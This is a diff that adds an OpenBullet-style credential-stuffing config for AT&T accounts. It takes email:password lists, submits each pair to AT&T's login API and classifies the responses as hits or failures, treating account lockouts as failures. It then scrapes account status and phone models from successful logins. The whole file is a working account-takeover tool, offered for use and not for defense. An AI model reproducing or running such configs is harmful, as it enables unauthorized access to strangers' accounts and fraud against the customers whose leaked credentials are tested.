@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "Name": "AT&T",
+  "SuggestedBots": 30,
+  "LastModified": "2018-05-28T05:08:29.2198851+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://m.att.com/my/#/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#LOGIN REQUEST POST "https://m.att.com/myatt/lgn/resources/unauth/login/tguard/authenticateandlogin" AutoRedirect=TRUE 
+  CONTENT "{\"CommonData\":{\"AppName\":\"MYATT\"},\"UserId\":\"<USER>\",\"Password\":\"<PASS>\",\"RememberMe\":\"Y\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://m.att.com/my/" 
+  HEADER "origin: https://m.att.com" 
+  HEADER "x-dtpc: 455490817_73h5" 
+  HEADER "x-requested-by: MYATT" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "temporarily locked your account" 
+    KEY "Verify that you've correctly entered your user name and password" 
+  KEYCHAIN Success OR 
+    KEY "SUCCESS" 
+REQUEST POST "https://att.inq.com/tagserver/logging/logdata" AutoRedirect=TRUE 
+  CONTENT "checksum=-285748843&_domain=att&evt=missedallrules&siteID=10004119&pageID=0&mID=unmarked%20page&url=https%3A%2F%2Fm.att.com%2Fmy%2F%23%2FaccountOverview&codeVersion=1526666530107" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://att.inq.com/tagserver/postToServer.htm" 
+  HEADER "origin: https://att.inq.com" 
+REQUEST POST "https://www.att.com/myatt/com/resources/auth/shared/native/overview/details" AutoRedirect=TRUE 
+  CONTENT "{\"CommonData\":{\"AppName\":\"D-MYATT\",\"Language\":\"EN\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.att.com" 
+  HEADER "referer: https://www.att.com/my/" 
+  HEADER "x-requested-by: MYATT" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "NOT_AUTHENTICATED" 
+#CAPTURE_STATUS PARSE "<SOURCE>" LR "\":{\"acc_status_iv_desc\":\"" "\"" Recursive=TRUE -> CAP "Status" "" "" 
+#CAPTURE_PHONES PARSE "<SOURCE>" LR "\"make_model\":\"" "\"" Recursive=TRUE -> CAP "Phone" "" "" 
+#CHECK_LOGIN_VALID REQUEST GET "https://www.att.com/olam/loginDisplay.olamexecute" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "You are not eligible for sign" 
